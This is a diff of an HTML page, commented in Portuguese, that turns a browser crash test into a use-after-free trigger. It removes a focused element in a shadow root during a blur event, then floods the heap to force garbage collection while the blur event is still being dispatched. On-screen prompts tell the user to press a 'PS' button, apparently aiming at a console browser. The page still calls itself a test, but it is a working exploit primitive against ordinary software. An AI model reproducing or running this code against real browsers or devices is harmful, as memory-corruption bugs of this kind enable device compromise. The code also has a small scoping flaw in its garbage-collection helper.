@@ -1,6 +1,95 @@
+<!DOCTYPE html>
+<html>
+<body>
+<p>This test passes if it does not crash.</p>
+<div id="host"></div>
+<div id="result" style="font-size:1.5em"></div>
+<button id="arm" style="font-size:3em;padding:1em;background:green;color:white;width:100%">
+  1) CLIQUE AQUI PRIMEIRO
+</button>
 <script>
-const n2 = document.createElement('div');
-document.documentElement.appendChild(n2);
-n2.attributeStyleMap.set('translate', ...document.documentElement.computedStyleMap().getAll('border-image-slice'));
+function gc() {
+    function gcRec(n) {
+        if (n < 1) return {};
+        var temp = {i: "ab" + i + (i / 100000)};
+        temp += "foo";
+        gcRec(n-1);
+    }
+    for (var i = 0; i < 10000; i++) gcRec(10);
+}
+
+function log(msg) {
+    var d = document.createElement('div');
+    d.textContent = msg;
+    result.appendChild(d);
+}
+
+var shadowRoot = host.attachShadow({ mode: 'open' });
+var victim = null;
+var armed  = false;
+
+document.addEventListener('blur', function onBlur(e) {
+    if (!armed || !victim) return;
+    armed = false;
+
+    log('[Blur] ' + e.target.tagName
+        + ' | wrapper age: ' + (Date.now() - victimBorn) + 'ms');
+
+    // Fase 1: zerar todas as referências C++ e JS
+    victim.remove();          // limpa m_focusedElement
+    victim = null;            // wrapper elegível para GC
+
+    // Fase 2: BURST — encher o nursery para forçar eden GC automático
+    // O eden GC roda quando o nursery está cheio e coleta objetos MORTOS
+    // O wrapper do victim está MORTO no nursery → coletado → elemento freed
+    // dispatchBlurEvent ainda está rodando → UAF → CRASH
+    var burst = [];
+    for (var i = 0; i < 300000; i++) {
+        burst.push({ a: i, b: i * 2, c: 'x' + i });
+        // eden GC pode rodar aqui dentro, no meio do loop
+        // se o wrapper ainda estiver no nursery, é coletado → UAF
+    }
+    burst = null;
+
+    // Fase 3: polyfill como fallback
+    gc();
+
+    log('[Passou o burst] — wrapper estava em old-gen (pressione mais rapido)');
+    arm.style.background = 'green';
+    arm.textContent = '1) CLIQUE AQUI PRIMEIRO';
+    document.removeEventListener('blur', onBlur, true);
+}, true);
+
+var victimBorn = 0;
+
+arm.addEventListener('click', function() {
+    // Limpar victim anterior se houver
+    if (victim) {
+        victim.remove();
+        victim = null;
+        gc();
+    }
+
+    // Criar victim AGORA (wrapper vai para o nursery)
+    victim = document.createElement('div');
+    victim.tabIndex = 0;
+    victim.textContent = 'TARGET';
+    shadowRoot.appendChild(victim);
+    victim.focus();
+    victimBorn = Date.now();
+
+    armed = true;
+    arm.style.background = 'red';
+    arm.textContent = '2) PRESSIONE O BOTÃO PS AGORA!!!';
+    log('[ARM] victim criado — pressione PS em < 1s');
+});
+
+window.addEventListener('blur', function() {
+    if (armed) log('[Window] blur');
+});
+document.addEventListener('visibilitychange', function() {
+    if (armed) log('[Visibility] ' + document.visibilityState);
+});
 </script>
-This test passes if it doesn't crash.
+</body>
+</html>
